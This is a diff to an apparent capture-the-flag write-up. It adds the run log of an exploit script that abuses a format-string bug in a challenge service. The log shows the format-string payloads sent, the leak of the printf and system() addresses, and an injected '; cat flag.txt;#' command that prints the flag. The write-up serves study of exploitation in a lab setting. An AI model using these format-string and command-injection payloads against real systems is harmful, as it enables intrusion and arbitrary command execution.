@@ -155,7 +155,49 @@ print("===Done! Last server response (includes flag):===\n" + receive())
 sock.close()
 ```
 
+On executing the script we obtain the flag,
+```text
+$ python say2.py 
+say2.py: Exploit initiated. Average return time is 25 seconds due to large string usage, so please be patient.
 
++ Determining printf() system address...
+        * Writing printf() pointer to stack location 16 using a pointer at stack location 9
+                * DATA SENT: %134519023x%9$n
+        * Dereferencing printf() pointer at stack location 16 to determine true address
+                * DATA SENT: %16$s
++ Calculating offset for system() call...
+        * Converting printf() true address into hexadecimal
+        * Formatting printf() true address from binary into integer form
+                * printf() true address: 0xf7635c70
+        * Calculating libc offsets to obtain system() address
+                * system() true address: 0xf76273e0
+        * Segmenting system address to write in 16-bit parts
+        * Priming stack by creating a pointer to the first half of printf() address
+                * DATA SENT: %134519025x%18$n
+        * Rewriting printf() address to system() address
+                * DATA SENT: %29535x%16$hn%33666x%55$hn
++ Executing payload (cat flag.txt)...
+        * DATA SENT: ; cat flag.txt;#
+===Done! Last server response (includes flag):===
+sh: 1: _: not found
+sh: 2: //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~: not found
+sh: 3: //: Permission denied
+c81743e812416612dbd5089fa7e44084
+sh: 4: //: Permission denied
+sh: 5: //: Permission denied
+sh: 6: //: Permission denied
+sh: 7: //: Permission denied
+sh: 8: //: Permission denied
+sh: 9: //___________________________________/: not found
+sh: 10: //: Permission denied
+sh: 11: //: Permission denied
+sh: 12: //: Permission denied
+sh: 13: //: Permission denied
+sh: 14: //: Permission denied
+sh: 15: //: Permission denied
+```
+
+The flag is `c81743e812416612dbd5089fa7e44084`
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwMTk5MjIyMjAsLTM2NDU2MjgyNF19
+eyJoaXN0b3J5IjpbLTYzMzIzNDIwMiwtMzY0NTYyODI0XX0=
 -->
